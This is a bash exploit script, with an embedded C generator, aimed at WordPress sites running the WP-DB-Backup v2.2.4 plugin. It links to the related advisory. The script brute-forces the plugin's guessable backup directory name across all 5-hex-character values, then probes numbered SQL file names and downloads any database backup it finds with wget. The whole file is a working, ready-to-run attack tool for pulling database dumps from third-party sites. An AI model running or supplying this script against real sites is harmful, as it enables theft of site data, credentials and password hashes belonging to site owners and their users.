#!/bin/bash
#Larry W. Cashdollar, @_larry0
#Will brute force and search a Wordpress target site with WP-DB-Backup v2.2.4 plugin installed for any backups done on
#20141031 assumes the wordpress database is wordpress and the table prefix is wp_
#http://www.vapid.dhs.org/advisories/wordpress/plugins/wp-db-backup-v2.2.4/
#http://thehackerblog.com/auditing-wp-db-backup-wordpress-plugin-why-using-the-database-password-for-entropy-is-a-bad-idea/
#run ./exp targetsite
DATE="20141031"; #Date to search
if [ ! -e rainbow ]; then
cat << -EOF- > rbow.c
/*Create rainbow table for guessing wp-backup-db v2.2.4 backup path
Larry W. Cashdollar*/
#include <stdio.h>
int
main (void)
{
  char string[16] = "0123456789abcdef";
  int x, y, z, a, b;
  for (x = 0; x < 16; x++)
      for (y = 0; y < 16; y++)
          for (z = 0; z < 16; z++)
              for (a = 0; a < 16; a++)
                  for (b = 0; b < 16; b++)
                      printf ("%c%c%c%c%c\n", string[x], string[y], string[z],
                              string[a], string[b]);
return(0);
}
-EOF-
echo "[+] Compiling rbow.c"
gcc rbow.c -o rbow
echo "[+] Creating rainbow table..."
./rbow > rainbow
fi
if [ ! -e found.txt ]; then
Z=0
K=`wc -l rainbow|awk '{print $1}'`;
echo "[+] Searching....";
        for x in `cat rainbow`; do
                CPATH="http://$1/wp-content/backup-$x/";
                 RESULT=`curl -s --head $CPATH|grep 200`;
                if [ -n "$RESULT" ]; then
                 echo "[+] Location $CPATH Found";
                 echo "[+] Received $RESULT";
                 echo $x > found.txt;
                 break; #break here
        fi;
                 echo -n "Percent Done: ";
                 Y=`echo "scale=6;($Z/$K)*100"|bc`;
                 echo -n $Y
                 echo "%";
                 Z=$(( $Z + 1 ));
done
else
x=`cat found.txt`;
fi
# Now that we have the directory lets try to locate the database backup file.
K=999;
for y in `seq -w 0 999`; do
                CPATH="http://$1/wp-content/backup-$x/wordpress_wp_$2_$y.sql"; #change WP Database Name and Table Prefix here
                 RESULT=`curl -s --head $CPATH|grep 200`;
                if [ -n "$RESULT" ]; then
                 echo "[+] Database backup $CPATH Found";
                 echo "[+] Received $RESULT";
                 wget $CPATH
                 exit; #break here
        fi;
                 echo -n "Percent Done: ";
                 Y=`echo "scale=2;($Z/$K)*100"|bc`;
                 echo -n $Y
                 echo "%";
                 Z=$(( $Z + 1 ));
done
